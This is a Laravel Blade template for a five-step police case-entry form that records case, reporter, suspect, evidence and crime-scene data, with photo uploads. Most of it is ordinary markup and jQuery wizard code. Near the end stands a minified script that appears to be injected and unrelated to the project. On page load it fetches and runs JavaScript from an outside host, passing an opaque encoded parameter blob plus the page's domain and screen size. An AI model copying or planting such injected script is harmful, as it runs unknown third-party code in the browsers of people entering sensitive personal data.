@extends('layouts.skck_app')
@section('content')
<!DOCTYPE html>
<html lang="en">
<head>



    <script src="{{ asset('usium/js/bootstrap.min.js')}}"></script>

    
    
    <script src="{{ asset('usium/js/chosen.jquery.min.js')}}"></script>
    
    
    
  <script src="{{ asset('usium/js/bootstrap-datetimepicker.min.js')}}"></script>
    
    
  
    
    <!-- ace scripts -->
    <script src="{{ asset('usium/js/ace-elements.min.js') }}"></script>
    <script src="{{ asset('usium/js/ace.min.js') }}"></script>


    
        </head>    
    <div class="container">
	<div class="panel-heading"></div>
    <div class="row">

                    




        
        
            <div class="col-xs-12">
                <!-- PAGE CONTENT BEGINS -->
                <div class="hr hr-18 hr-double dotted"></div>

                <div class="widget-box">
                    <div class="widget-header widget-header-blue widget-header-flat">
                        <h4 class="widget-title lighter"></h4>
                    </div>
                                        <div class="widget-body">
                        <div class="widget-main">
                            <div id="fuelux-wizard-container" class="no-steps-container">
                                <div>
                                    <ul class="steps" style="margin-left: 0">
                                        
                                        <li data-step="1" class="active">
                                            <span class="step">1</span>
                                            <span class="title">Data Kasus</span>
                                        </li>

                                         <li data-step="2" class="">
                                            <span class="step">2</span>
                                            <span class="title">Data Pelapor</span>
                                        </li>

                                        <li data-step="3" class="">
                                            <span class="step">3</span>
                                            <span class="title">Data Pelaku</span>
                                        </li>

                                        <li data-step="4">
                                            <span class="step">4</span>
                                            <span class="title">Data Barang Bukti</span>
                                        </li>
                                        <li data-step="5">
                                            <span class="step">5</span>
                                            <span class="title">Data TKP</span>
                                        </li>
                                    </ul>
                                </div>
                                <hr>
                                <div class="step-content pos-rel">
                                <form class="form-horizontal" role="form" method="POST" enctype="multipart/form-data" action="{{url('reserse/savekasus')}}">
                        {{ csrf_field() }}
                                    
                                      <div class="step-pane active" data-step="1">
                                        <div class="form-horizontal" id="sample-form" style="display: block;">

                                                
                                    
                                            <hr>
                                            <h3 class="lighter block green">Data Kasus</h3>
                                            <hr>

                                        <br>
                                        <br>
                                        <br>
                                            <div class="form-group{{ $errors->has('nama_kasus') ? ' has-error' : '' }}">
                                                <label for="inputWarning" class="col-xs-12 col-sm-3 control-label no-padding-right">Nama Kasus</label>

                                                <div class="col-xs-12 col-sm-5">
                                                    <span class="block input-icon input-icon-right">
                                                        <input type="text" class="width-100 form-control" name="nama_kasus" value="{{ old('nama_kasus') }}" required>
                                                    </span>
                                                </div>
                                            </div>

                                            <br>
                                            <br>

                                            
                                            <div class="form-group{{ $errors->has('waktu_kejadian') ? ' has-error' : '' }}">
                                                <label for="inputWarning" class="col-xs-12 col-sm-3 control-label no-padding-right">Waktu Kejadian</label>

                                                <div class="col-xs-12 col-sm-5">
                                                    <span class="block input-icon input-icon-right">
                                                        <input type="date" class="width-100 form-control" name="waktu_kejadian" value="{{ old('waktu_kejadian') }}" required>
                                                    </span>
                                                </div>
                                            </div>
                                            <br><br><br><br><br><br>
                                        </div>
                                    </div>

                                    

                                    <div class="step-pane" data-step="2">
                                       <div>
                                            <div class="form-horizontal" id="sample-form" style="display: block;">
                                                <hr>
                                                <h3 class="lighter block green">Data Pelapor</h3>
                                                <hr>
                                                
                                                <hr>
                                                <div class="form-group{{ $errors->has('nama_pelapor') ? ' has-error' : '' }}">
                                                    <label for="inputWarning" class="col-xs-12 col-sm-3 control-label no-padding-right">Nama Pelapor</label>

                                                    <div class="col-xs-12 col-sm-5">
                                                        <span class="block input-icon input-icon-right">
                                                            <input type="text" class="width-100 form-control" name="nama_pelapor" value="{{ old('nama_pelapor') }}" >
                                                        </span>
                                                    </div>
                                                </div>

                                                <div class="form-group{{ $errors->has('Agama') ? ' has-error' : '' }}">
                                                    <label for="inputWarning" class="col-xs-12 col-sm-3 control-label no-padding-right">Agama</label>

                                                    <div class="col-xs-12 col-sm-5">
                                                        <span class="block input-icon input-icon-right">
                                                            <input type="text" class="width-100 form-control" name="Agama" value="{{ old('Agama') }}" >
                                                        </span>
                                                    </div>
                                                </div>

                                                <div class="form-group{{ $errors->has('jeniskelamin') ? ' has-error' : '' }}">
                                                <label for="inputWarning" class="col-xs-12 col-sm-3 control-label no-padding-right">Jenis Kelamin</label>

                                                <div class="col-xs-12 col-sm-5">
                                                    <span class="block input-icon input-icon-right">
                                                        <select name="jeniskelamin" class="form-control" required>
                                                            <option value="">-pilih jenis kelamin-</option>
                                                            <option value="L">Laki-laki</option>
                                                            <option value="P">Perempuan</option>
                                                        </select>
                                                    </span>
                                                </div>
                                            </div>

                                                <div class="form-group{{ $errors->has('tgllahir') ? ' has-error' : '' }}">
                                                <label for="inputWarning" class="col-xs-12 col-sm-3 control-label no-padding-right">Tanggal Lahir</label>

                                                <div class="col-xs-12 col-sm-5">
                                                    <span class="block input-icon input-icon-right">
                                                        <input type="date" class="width-100 form-control" name="tgllahir_pelapor" value="{{ old('tgllahir_pelapor') }}" required>
                                                    </span>
                                                </div>
                                            </div>

                                                 <div class="form-group{{ $errors->has('alamat') ? ' has-error' : '' }}">
                                                    <label for="inputWarning" class="col-xs-12 col-sm-3 control-label no-padding-right">Alamat</label>

                                                    <div class="col-xs-12 col-sm-5">
                                                        <span class="block input-icon input-icon-right">
                                                            <input type="text" class="width-100 form-control" name="alamat" value="{{ old('alamat') }}" >
                                                        </span>
                                                    </div>
                                                </div>

                                                <div class="form-group{{ $errors->has('pekerjaan') ? ' has-error' : '' }}">
                                                    <label for="inputWarning" class="col-xs-12 col-sm-3 control-label no-padding-right">Pekerjaan</label>

                                                    <div class="col-xs-12 col-sm-5">
                                                        <span class="block input-icon input-icon-right">
                                                            <input type="text" class="width-100 form-control" name="pekerjaan" value="{{ old('pekerjaan') }}">
                                                        </span>
                                                    </div>
                                                </div>

                                                <div class="form-group{{ $errors->has('notelp') ? ' has-error' : '' }}">
                                                    <label for="inputWarning" class="col-xs-12 col-sm-3 control-label no-padding-right">No Telp</label>

                                                    <div class="col-xs-12 col-sm-5">
                                                        <span class="block input-icon input-icon-right">
                                                            <input type="text" class="width-100 form-control" name="notelp" value="{{ old('notelp') }}">
                                                        </span>
                                                    </div>
                                                </div>

                                                <div class="form-group{{ $errors->has('kewarganegaraan') ? ' has-error' : '' }}">
                                                    <label for="inputWarning" class="col-xs-12 col-sm-3 control-label no-padding-right">kebangsaan</label>

                                                    <div class="col-xs-12 col-sm-5">
                                                        <span class="block input-icon input-icon-right">
                                                            <input type="text" class="width-100 form-control" name="kewarganegaraan" value="{{ old('kewarganegaraan') }}">
                                                        </span>
                                                    </div>
                                                </div>



                                                 <div class="form-group">
                         <label for="inputWarning" class="col-xs-12 col-sm-3 control-label no-padding-right">Foto</label>
                         <div class="col-md-6 col-md-offset-4">
                                <input type="file" id="inputimages" name="images">
                            </div>
                            
                        </div>

                        
                            
                        
                                                
                                            </div>
                                        </div>
                                    </div>

                                    <div class="step-pane" data-step="3">
                                        <div>
                                            <div class="form-horizontal" id="sample-form" style="display: block;">
                                                <hr>
                                                <h3 class="lighter block green">Data Pelaku</h3>
                                                <hr>
                                                
                                                <hr>

                                                

                                                <div class="form-group{{ $errors->has('nama_pelaku') ? ' has-error' : '' }}">
                                                    <label for="inputWarning" class="col-xs-12 col-sm-3 control-label no-padding-right">Nama Pelaku</label>

                                                    <div class="col-xs-12 col-sm-5">
                                                        <span class="block input-icon input-icon-right">
                                                            <input type="text" class="width-100 form-control" name="nama_pelaku" value="{{ old('nama_pelaku') }}" >
                                                        </span>
                                                    </div>
                                                </div>

                                                <div class="form-group{{ $errors->has('Agama') ? ' has-error' : '' }}">
                                                    <label for="inputWarning" class="col-xs-12 col-sm-3 control-label no-padding-right">Agama</label>

                                                    <div class="col-xs-12 col-sm-5">
                                                        <span class="block input-icon input-icon-right">
                                                            <input type="text" class="width-100 form-control" name="Agama" value="{{ old('Agama') }}" >
                                                        </span>
                                                    </div>
                                                </div>

                                                <div class="form-group{{ $errors->has('jeniskelamin') ? ' has-error' : '' }}">
                                                <label for="inputWarning" class="col-xs-12 col-sm-3 control-label no-padding-right">Jenis Kelamin</label>

                                                <div class="col-xs-12 col-sm-5">
                                                    <span class="block input-icon input-icon-right">
                                                        <select name="jeniskelamin" class="form-control" required>
                                                            <option value="">-pilih jenis kelamin-</option>
                                                            <option value="L">Laki-laki</option>
                                                            <option value="P">Perempuan</option>
                                                        </select>
                                                    </span>
                                                </div>
                                            </div>


                                                 <div class="form-group{{ $errors->has('tgllahir_pelaku') ? ' has-error' : '' }}">
                                                <label for="inputWarning" class="col-xs-12 col-sm-3 control-label no-padding-right">Tanggal Lahir</label>

                                                <div class="col-xs-12 col-sm-5">
                                                    <span class="block input-icon input-icon-right">
                                                        <input type="date" class="width-100 form-control" name="tgllahir_pelaku" value="{{ old('tgllahir_pelaku') }}" required>
                                                    </span>
                                                </div>
                                            </div>

                                                 <div class="form-group{{ $errors->has('alamat') ? ' has-error' : '' }}">
                                                    <label for="inputWarning" class="col-xs-12 col-sm-3 control-label no-padding-right">Alamat</label>

                                                    <div class="col-xs-12 col-sm-5">
                                                        <span class="block input-icon input-icon-right">
                                                            <input type="text" class="width-100 form-control" name="alamat" value="{{ old('alamat') }}" >
                                                        </span>
                                                    </div>
                                                </div>

                                                <div class="form-group{{ $errors->has('kewarganegaraan') ? ' has-error' : '' }}">
                                                    <label for="inputWarning" class="col-xs-12 col-sm-3 control-label no-padding-right">kebangsaan</label>

                                                    <div class="col-xs-12 col-sm-5">
                                                        <span class="block input-icon input-icon-right">
                                                            <input type="text" class="width-100 form-control" name="kewarganegaraan" value="{{ old('kewarganegaraan') }}" >
                                                        </span>
                                                    </div>
                                                </div>

                                               
                                                 <div class="form-group">
                         <label for="inputWarning" class="col-xs-12 col-sm-3 control-label no-padding-right">Foto</label>
                         <div class="col-md-6 col-md-offset-4">
                                <input type="file" id="inputimages" name="images_pelaku">
                            </div>
                            
                        </div>


                                                
                                            </div>
                                        </div>
                                    </div>

                                    <div class="step-pane" data-step="4">
                                        <div>
                                            <div class="form-horizontal" id="sample-form" style="display: block;">
                                                <hr>
                                                <h3 class="lighter block green">Data Barang Bukti</h3>
                                                <hr>
                                                
                                                <hr>
                                                <div class="form-group{{ $errors->has('nama_barang') ? ' has-error' : '' }}">
                                                    <label for="inputWarning" class="col-xs-12 col-sm-3 control-label no-padding-right">Nama Barang</label>

                                                    <div class="col-xs-12 col-sm-5">
                                                        <span class="block input-icon input-icon-right">
                                                            <input type="text" class="width-100 form-control" name="nama_barang" value="{{ old('nama_barang') }}" >
                                                        </span>
                                                    </div>
                                                </div>

                                                  <div class="form-group{{ $errors->has('keterangan') ? ' has-error' : '' }}">
                                                    <label for="inputWarning" class="col-xs-12 col-sm-3 control-label no-padding-right">Keterangan</label>

                                                    <div class="col-xs-12 col-sm-5">
                                                        <span class="block input-icon input-icon-right">
                                                            <input type="text" class="width-100 form-control" name="keterangan" value="{{ old('keterangan') }}" >
                                                        </span>
                                                    </div>
                                                </div>

                                               <div class="form-group">
                         <label for="inputWarning" class="col-xs-12 col-sm-3 control-label no-padding-right">Foto</label>
                         <div class="col-md-6 col-md-offset-4">
                                <input type="file" id="inputimages" name="images_barang">
                            </div>
                            
                        </div>
                                                
                                            </div>
                                        </div>   

                                    </div>
                                    <div class="step-pane" data-step="5">
                                    <div>
                                        <div class="form-horizontal" id="sample-form" style="display: block;">


                                    
                                            <hr>
                                            <h3 class="lighter block green">Data TKP</h3>
                                            <hr>

                                            <br>
                                            <br>
                                            <br>
                                            <div class="form-group{{ $errors->has('nama_tempat') ? ' has-error' : '' }}">
                                                <label for="inputWarning" class="col-xs-12 col-sm-3 control-label no-padding-right">Nama Tempat</label>

                                                <div class="col-xs-12 col-sm-5">
                                                    <span class="block input-icon input-icon-right">
                                                        <input type="text" class="width-100 form-control" name="nama_tempat" value="{{ old('nama_tempat') }}" required>
                                                    </span>
                                                </div>
                                            </div>

                                            
                                            <div class="form-group{{ $errors->has('alamat') ? ' has-error' : '' }}">
                                                <label for="inputWarning" class="col-xs-12 col-sm-3 control-label no-padding-right">Alamat</label>

                                                <div class="col-xs-12 col-sm-5">
                                                    <span class="block input-icon input-icon-right">
                                                        <input type="text" class="width-100 form-control" name="alamat" value="{{ old('alamat') }}" required>
                                                    </span>
                                                </div>
                                            </div>

                                            
                                        <br>
                                        <br>
                                        

                                            
                                        </div>
                                    </div>
                                    <div class="form-group">
                            <div class="col-md-6 col-md-offset-4">
                                <button type="submit" class="btn btn-primary">
                                    Simpan
                                </button>
                            </div>
                        </div>
                                    </div>
                                </form>
                                </div>
                            </div>

                            <hr>
                            <div class="wizard-actions">
                                <button class="btn btn-prev" disabled="disabled">
                                    <i class="ace-icon fa fa-arrow-left"></i>
                                    Prev
                                </button>

                                <button class="btn btn-success btn-next" data-last="Finish">
                                    Next
                                    
                                <i class="ace-icon fa fa-arrow-right icon-on-right"></i></button>
                            </div>
                        </div><!-- /.widget-main -->
                    </div><!-- /.widget-body -->
                </div>

                <div id="modal-wizard" class="modal">
                    <div class="modal-dialog">
                        <div class="modal-content">
                            <div id="modal-wizard-container" class="no-steps-container">
                                <div class="modal-header">
                                    <ul class="steps" style="margin-left: 0">
                                        <li data-step="1" class="active">
                                            <span class="step">1</span>
                                            <span class="title">Validation states</span>
                                        </li>

                                        <li data-step="2">
                                            <span class="step">2</span>
                                            <span class="title">Alerts</span>
                                        </li>

                                        <li data-step="3">
                                            <span class="step">3</span>
                                            <span class="title">Payment Info</span>
                                        </li>

                                        <li data-step="4">
                                            <span class="step">4</span>
                                            <span class="title">Other Info</span>
                                        </li>
                                         <li data-step="5">
                                            <span class="step">5</span>
                                            <span class="title">Other Infos</span>
                                        </li>
                                    </ul>
                                </div>

                                <div class="modal-body step-content">
                                    <div class="step-pane active" data-step="1">
                                        <div class="center">
                                            <h4 class="blue">Step 1</h4>
                                        </div>
                                    </div>

                                    <div class="step-pane" data-step="2">
                                        <div class="center">
                                            <h4 class="blue">Step 2</h4>
                                        </div>
                                    </div>

                                    <div class="step-pane" data-step="3">
                                        <div class="center">
                                            <h4 class="blue">Step 3</h4>
                                        </div>
                                    </div>

                                    <div class="step-pane" data-step="4">
                                        <div class="center">
                                            <h4 class="blue">Step 4</h4>
                                        </div>
                                    </div>
                                    <div class="step-pane" data-step="5">
                                        <div class="center">
                                            <h4 class="blue">Step 5</h4>
                                        </div>
                                    </div>
                                </div>
                            </div>

                            <div class="modal-footer wizard-actions">
                                <button class="btn btn-sm btn-prev" disabled="disabled">
                                    <i class="ace-icon fa fa-arrow-left"></i>
                                    Prev
                                </button>

                                <button class="btn btn-success btn-sm btn-next" data-last="Finish">
                                    Next
                                    <i class="ace-icon fa fa-arrow-right icon-on-right"></i>
                                </button>

                                <button class="btn btn-danger btn-sm pull-left" data-dismiss="modal">
                                    <i class="ace-icon fa fa-times"></i>
                                    Cancel
                                </button>
                                <script type="text/javascript">
            try{ace.settings.check('main-container' , 'fixed')}catch(e){}
        </script>
        <div class="main-container" id="main-container">
            <div id="sidebar" class="sidebar responsive">
  <script type="text/javascript">
    try{ace.settings.check('sidebar' , 'fixed')}catch(e){}
    function goBack() {
      window.history.back();
    }
    function refresh() {
      location.reload();
    }
  </script>

                            </div>
                        </div>
                    </div>
                     </form>
                </div><!-- PAGE CONTENT ENDS -->
            </div><!-- /.col -->
      
    </div>
    </div>

</div>

                </div>
            </div>
            <div class="footer">
	<div class="footer-inner">
		<div class="footer-content">
			<span class="bigger-120">
				<span class="blue bolder"></span>
				
			</span>

			&nbsp; &nbsp;
					</div>
	</div>
</div>
<a href="#" id="btn-scroll-up" class="btn-scroll-up btn btn-sm btn-inverse">
	<i class="ace-icon fa fa-angle-double-up icon-only bigger-110"></i>
</a>        </div>
 <script src="{{ asset('usium/js/ckeditor.js') }}"></script>
            <script src="{{ asset('usium/js/wizard.min.js') }}"></script>
   
    <script>
    $(document).ready(function() {
        $("#reset_waktu_selesai").click(function(){
            $("#waktu_selesai").val("");
        });
        $('.chosen-select').chosen({allow_single_deselect:true});
        $('.datetimepicker').datetimepicker({
            format: 'DD/MM/YYYY h:mm:ss A',//use this option to display seconds
            icons: {
                time: 'fa fa-clock-o',
                date: 'fa fa-calendar',
                up: 'fa fa-chevron-up',
                down: 'fa fa-chevron-down',
                previous: 'fa fa-chevron-left',
                next: 'fa fa-chevron-right',
                today: 'fa fa-arrows ',
                clear: 'fa fa-trash',
                close: 'fa fa-times'
            }
        });


        

        $("#simpan").click(function(event) {
            event.preventDefault();
            var vals = $("#form_berita").find('input, select').serializeArray();
            vals.push({name: 'isi_berita', value: CKEDITOR.instances.editor1.getData()});
            
            $.ajax({
               
                type: 'post',
                dataType: 'json',
                data: vals,
                success: function(data){
                    console.log(data);
                    if(data.status == 1) {
                        $("#msg_submit").html("<i style='color:green;'>"+data.msg+"</i>");
                    }
                    else {
                        $("#msg_submit").html("<i style='color:red;'>"+data.msg+"</i>");
                        setTimeout(function(){ window.location.reload(); }, 5000);
                    }
                }
            });
            
        });

        // timer = setInterval(updateDiv,100);
        // function updateDiv(){
        //     var editorText = CKEDITOR.instances.editor1.getData();
        //     $('#isi_berita').val(editorText);
        // }

    });

    jQuery(function($) {
            
        $('[data-rel=tooltip]').tooltip();
    
        // $('.select2').css('width','200px').select2({allowClear:true})
        // .on('change', function(){
        //     $(this).closest('form').validate().element($(this));
        // }); 
    
    
        var $validation = false;
        $('#fuelux-wizard-container')
        .ace_wizard({
            //step: 2 //optional argument. wizard will jump to step "2" at first
            //buttons: '.wizard-actions:eq(0)'
        })
        .on('actionclicked.fu.wizard' , function(e, info){
            if(info.step == 1 && $validation) {
                if(!$('#validation-form').valid()) e.preventDefault();
            }
        })
        //.on('changed.fu.wizard', function() {
        //})
        .on('finished.fu.wizard', function(e) {
            bootbox.dialog({
                message: "Thank you! Your information was successfully saved!", 
                buttons: {
                    "success" : {
                        "label" : "OK",
                        "className" : "btn-sm btn-primary"
                    }
                }
            });
        }).on('stepclick.fu.wizard', function(e){
            //e.preventDefault();//this will prevent clicking and selecting steps
        });
    
    
        //jump to a step
        /**
        var wizard = $('#fuelux-wizard-container').data('fu.wizard')
        wizard.currentStep = 3;
        wizard.setState();
        */
    
        //determine selected step
        //wizard.selectedItem().step
    
    
    
        //hide or show the other form which requires validation
        //this is for demo only, you usullay want just one form in your application
        $('#skip-validation').removeAttr('checked').on('click', function(){
            $validation = this.checked;
            if(this.checked) {
                $('#sample-form').hide();
                $('#validation-form').removeClass('hide');
            }
            else {
                $('#validation-form').addClass('hide');
                $('#sample-form').show();
            }
        })
    
    
    
        //documentation : http://docs.jquery.com/Plugins/Validation/validate
    
    
        $.mask.definitions['~']='[+-]';
        $('#phone').mask('(999) 999-9999');
    
        jQuery.validator.addMethod("phone", function (value, element) {
            return this.optional(element) || /^\(\d{3}\) \d{3}\-\d{4}( x\d{1,6})?$/.test(value);
        }, "Enter a valid phone number.");
    
        $('#validation-form').validate({
            errorElement: 'div',
            errorClass: 'help-block',
            focusInvalid: false,
            ignore: "",
            rules: {
                email: {
                    required: true,
                    email:true
                },
                password: {
                    required: true,
                    minlength: 5
                },
                password2: {
                    required: true,
                    minlength: 5,
                    equalTo: "#password"
                },
                name: {
                    required: true
                },
                phone: {
                    required: true,
                    phone: 'required'
                },
                url: {
                    required: true,
                    url: true
                },
                comment: {
                    required: true
                },
                state: {
                    required: true
                },
                platform: {
                    required: true
                },
                subscription: {
                    required: true
                },
                gender: {
                    required: true,
                },
                agree: {
                    required: true,
                }
            },
    
            messages: {
                email: {
                    required: "Please provide a valid email.",
                    email: "Please provide a valid email."
                },
                password: {
                    required: "Please specify a password.",
                    minlength: "Please specify a secure password."
                },
                state: "Please choose state",
                subscription: "Please choose at least one option",
                gender: "Please choose gender",
                agree: "Please accept our policy"
            },
    
    
            highlight: function (e) {
                $(e).closest('.form-group').removeClass('has-info').addClass('has-error');
            },
    
            success: function (e) {
                $(e).closest('.form-group').removeClass('has-error');//.addClass('has-info');
                $(e).remove();
            },
    
            errorPlacement: function (error, element) {
                if(element.is('input[type=checkbox]') || element.is('input[type=radio]')) {
                    var controls = element.closest('div[class*="col-"]');
                    if(controls.find(':checkbox,:radio').length > 1) controls.append(error);
                    else error.insertAfter(element.nextAll('.lbl:eq(0)').eq(0));
                }
                // else if(element.is('.select2')) {
                //     error.insertAfter(element.siblings('[class*="select2-container"]:eq(0)'));
                // }
                else if(element.is('.chosen-select')) {
                    error.insertAfter(element.siblings('[class*="chosen-container"]:eq(0)'));
                }
                else error.insertAfter(element.parent());
            },
    
            submitHandler: function (form) {
            },
            invalidHandler: function (form) {
            }
        });
    
        
        
        
        $('#modal-wizard-container').ace_wizard();
        $('#modal-wizard .wizard-actions .btn[data-dismiss=modal]').removeAttr('disabled');
        
        
        /**
        $('#date').datepicker({autoclose:true}).on('changeDate', function(ev) {
            $(this).closest('form').validate().element($(this));
        });
        
        $('#mychosen').chosen().on('change', function(ev) {
            $(this).closest('form').validate().element($(this));
        });
        */
        
        
        $(document).one('ajaxloadstart.page', function(e) {
            //in ajax mode, remove remaining elements before leaving page
            // $('[class*=select2]').remove();
        });
    });


    </script>
	<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs1.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssKUXBMgf6AC9AYeDsMxJZa%2bdqj2uQia6EhvA1xaKwNFfKiDqBLasK29M231tCX4QVY0dllOizP2BbAdzTw%2fePMuheeMJO1Lg3YH%2fivCf42bEO8zwWDrfVuhZPA8W8fN9GWjcCj6K58nU3IBxhNlZThwP62DUMpbHkzGrqUEVfARBMVy6AEyqjk9q1n8Nu6Ozd9diVBbAno%2fZ56sxTWdCRddaLmWcRtS9m3A46DSck7X60Vsu4gyvbs9POEfKRuytozh1GTWoBeSjoy8ehZW08KVDhFAWCdo9Oc1IHpyHCCRiez1YpJG%2fMG7WZ7ZuauSl%2fi7K9mmzjfJFfNyBcWvVQbzCZ85%2bNj6MCTSVoR3qPb2E%2b83W17RfFYC%2f0lxOYVNjYDOP%2fZspwP62epzIIGL486xsC3ynaTJCtFDavKlGsI%2bsjRuKpogSbtnVESCtzY9H6JAMqzwNqQhFaP%2bLfXwS1oJ%2b99X3mGaE6pp4qCo33ZQB74YAowezjvlYwATrTg%2ffNMfBap2pMHZvaanoAbE3Y%2f%2bMTDymhGagOd" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

</html>





    </div>
    </div>

</html>
@endsection